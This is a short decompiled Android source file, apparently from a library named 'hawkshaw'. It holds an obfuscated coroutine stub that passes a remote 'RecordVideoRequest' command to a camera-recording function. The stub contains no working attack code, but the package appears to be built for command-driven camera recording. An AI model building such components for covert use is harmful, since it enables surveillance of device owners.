package com.hawkshaw.library.features.media.camera;

import A.d;
import android.content.Context;
import androidx.lifecycle.C0266w;
import c3.C0325c;
import com.hawkshaw.library.datalayer.models.Command;
import java.util.concurrent.ExecutorService;
import o.z0;

public final class c extends C0325c {

    /* renamed from: D  reason: collision with root package name */
    public Object f4981D;

    /* renamed from: E  reason: collision with root package name */
    public Command.RecordVideoRequest f4982E;

    /* renamed from: F  reason: collision with root package name */
    public d f4983F;

    /* renamed from: G  reason: collision with root package name */
    public ExecutorService f4984G;

    /* renamed from: H  reason: collision with root package name */
    public z0 f4985H;

    /* renamed from: I  reason: collision with root package name */
    public /* synthetic */ Object f4986I;

    /* renamed from: J  reason: collision with root package name */
    public int f4987J;

    public final Object invokeSuspend(Object obj) {
        this.f4986I = obj;
        this.f4987J |= Integer.MIN_VALUE;
        return RecordVideoKt.recordVideo((Context) null, (C0266w) null, (Command.RecordVideoRequest) null, (d) null, this);
    }
}
